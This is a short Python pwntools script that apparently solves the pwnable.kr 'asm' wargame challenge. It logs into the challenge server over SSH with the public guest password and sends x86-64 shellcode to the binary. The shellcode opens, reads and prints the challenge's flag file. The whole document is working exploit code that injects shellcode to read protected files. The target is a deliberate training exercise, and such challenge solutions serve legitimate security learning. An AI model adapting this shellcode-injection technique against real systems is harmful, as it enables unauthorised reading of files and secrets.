from pwn import *

s = ssh('asm', 'pwnable.kr', port=2222, password='guest')

p = s.process('./asm')

context.clear(arch='amd64')

shell = asm(
    shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong') +
    shellcraft.read('rax', 'rsp', 100) +
    shellcraft.write(1, 'rsp', 100)
)

p.sendline(shell)

print(p.recvall())